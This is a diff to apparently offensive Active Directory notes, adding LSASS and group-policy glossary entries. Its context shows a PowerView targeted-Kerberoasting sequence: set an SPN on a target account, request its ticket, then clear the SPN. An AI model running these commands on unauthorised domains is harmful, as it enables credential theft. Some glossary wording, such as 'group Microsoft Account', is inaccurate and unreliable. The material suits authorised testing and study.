@@ -45,6 +45,9 @@ The Local Administrator Password Solution is a tool for storing local admin pass
 ## LDAP 
 The Lightweight Directory Access Protocol is a network protocol for querying and modifying information from distributed directory services. The protocol listens on port 389 and 636 (LDAP over SSL).
 
+## LSASS
+The Local Security Authority Server Service (LSASS) process verifies user loggings, handles password changes, creates access tokens and writes to security logs.
+
 ## msDS-GroupMSAMembership
 This attribute is used for access checks to determine if a requestor has permission to retrieve the password for a group Microsoft Account.
 
@@ -153,6 +156,9 @@ Depending on the options used for Sharphound, the following information is colle
         GPOs can be linked to domains or to organizational units.
         These links can be enforced.
         For example, if a GP is linked to an OU, OUs that inherit the properties of the source OU cannot block inheritance.
+        Group policies are periodically applied to the registry.
+        However, when the operating system attempts to authorize a user, only the registry will be checked.
+
 
     -Organizational Units Tree Structure
         Organizational units are collections of user, computer and group objects.
@@ -721,7 +727,7 @@ PS> $SecPassword = ConvertTo-SecureString '<attackerPassword>' -AsPlainText -For
 PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<attackerUser>', $SecPassword)
 PS> Set-DomainObject -Credential $Cred -Identity <targetAccount> -SET @{serviceprincipalname='<service>/<hostname>'}
 PS> Get-DomainSPNTicket -Credential $Cred <targetAccount> | fl
-		PS> Set-DomainObject -Credential $Cred -Identity <targetAccount> -Clear serviceprincipalname
+        PS> Set-DomainObject -Credential $Cred -Identity <targetAccount> -Clear serviceprincipalname
 ```
 
 
